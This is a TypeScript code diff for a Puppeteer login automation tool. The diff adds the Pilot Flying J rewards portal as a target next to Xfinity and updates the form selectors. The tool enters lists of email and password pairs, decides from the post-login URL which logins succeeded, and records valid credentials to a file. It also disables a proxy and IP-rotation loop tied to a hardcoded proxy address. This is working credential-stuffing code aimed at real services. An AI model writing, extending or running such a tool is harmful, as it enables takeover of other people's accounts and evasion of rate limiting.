@@ -40,6 +40,7 @@ interface PageConfiguration {
 
 interface ConfigurationPerPage {
   xfinity: PageConfiguration;
+  pilotflyingj: PageConfiguration;
 }
 
 const CONFIGURATION_PER_PAGE: ConfigurationPerPage = {
@@ -48,12 +49,17 @@ const CONFIGURATION_PER_PAGE: ConfigurationPerPage = {
     loanAmountSelector: '#amount',
     formSelector: '#homepage-form',
   },
+  pilotflyingj: {
+    pageUrl: 'https://loyaltyportal.pilotflyingj.com/myrewards/login',
+    loanAmountSelector: '#amount',
+    formSelector: '#homepage-form',
+  },
 };
 
 const SELECTORS = {
-  emailInput: '#user',
-  password: '#passwd',
-  submitButton: '#sign_in',
+  emailInput: '#Email',
+  password: '#Password',
+  submitButton: '#loginForm > div > button',
   userHint: '#user-hint',
   passwdHint: '#passwd-hint',
 };
@@ -134,7 +140,7 @@ export const getCredentialInformationScrapper = async (
   let _browser = await pupeeteer.launch({
     headless: HEADLESS,
     // headless: false,
-    args: ['--proxy-server=162.244.132.210:6021'],
+    // args: ['--proxy-server=162.244.132.210:6021'],
   });
 
   // const page = await browser.newPage();
@@ -151,38 +157,38 @@ export const getCredentialInformationScrapper = async (
 
   try {
     await page.goto(pageUrl, {
-      waitUntil: 'networkidle2',
+      waitUntil: 'domcontentloaded',
     });
 
-    while (isInvalidIp) {
-      ip = await getIP();
+    // while (isInvalidIp) {
+    //   ip = await getIP();
 
-      isInvalidIp = await validateIp(ip, pageConfigKey);
+    //   isInvalidIp = await validateIp(ip, pageConfigKey);
 
-      if (isInvalidIp) {
-        console.log(`CURRENT IP: ${ip}`);
-      }
-      await _browser.close();
+    //   if (isInvalidIp) {
+    //     console.log(`CURRENT IP: ${ip}`);
+    //   }
+    //   await _browser.close();
 
-      _browser = await pupeeteer.launch({
-        headless: HEADLESS,
-        // headless: false,
-        args: ['--proxy-server=162.244.132.210:6021'],
-      });
+    //   _browser = await pupeeteer.launch({
+    //     headless: HEADLESS,
+    //     // headless: false,
+    //     args: ['--proxy-server=162.244.132.210:6021'],
+    //   });
 
-      page = await _browser.newPage();
+    //   page = await _browser.newPage();
 
-      await page.setViewport({
-        width: 1920 / 1.5,
-        height: 1080 / 1.5,
-      });
+    //   await page.setViewport({
+    //     width: 1920 / 1.5,
+    //     height: 1080 / 1.5,
+    //   });
 
-      await page.goto(pageUrl, {
-        waitUntil: 'networkidle2',
-      });
+    //   await page.goto(pageUrl, {
+    //     waitUntil: 'networkidle2',
+    //   });
 
-      await new Promise((r) => setTimeout(r, 3000));
-    }
+    //   await new Promise((r) => setTimeout(r, 3000));
+    // }
 
     // console.log('out of loop');
 
@@ -208,46 +214,26 @@ export const getCredentialInformationScrapper = async (
 
     await page.type(SELECTORS.emailInput, credential.email);
 
+    await page.type(SELECTORS.password, credential.password);
+
     // await page.type(SELECTORS.ssnInput, credential.last4ssn);
 
     await Promise.all([
       await page.click(SELECTORS.submitButton),
       await page.waitForNavigation({
         timeout: TIMEOUT_WAIT_FOR_NAVIGATION_MILLISECONDS,
-        waitUntil: 'networkidle0',
+        waitUntil: 'domcontentloaded',
       }),
     ]);
 
-    await new Promise((r) => setTimeout(r, 1000));
+    await new Promise((r) => setTimeout(r, 800));
 
-    const passwordInput = await page.$(SELECTORS.password);
+    if (page.url().includes('home')) {
+      const outputMessage = generateOutputMessage(credential, page.url(), ip);
 
-    // true if email is valid and password input exist else invalid
-    if (passwordInput) {
-      await page.type(SELECTORS.password, credential.password);
+      logger.info(outputMessage);
 
-      await Promise.all([
-        await page.click(SELECTORS.submitButton),
-        await page.waitForNavigation({
-          timeout: TIMEOUT_WAIT_FOR_NAVIGATION_MILLISECONDS,
-          waitUntil: 'networkidle0',
-        }),
-      ]);
-
-      // true if password is valid else invalid
-      if (page.url().includes('auth')) {
-        const outputMessage = generateOutputMessage(credential, page.url(), ip);
-
-        logger.info(outputMessage);
-
-        validWriteLineOnFile(outputMessage);
-      } else {
-        const outputMessage = generateOutputMessage(credential, page.url(), ip);
-
-        logger.error(outputMessage);
-
-        invalidWriteLineOnFile(outputMessage);
-      }
+      validWriteLineOnFile(outputMessage);
     } else {
       const outputMessage = generateOutputMessage(credential, page.url(), ip);
 
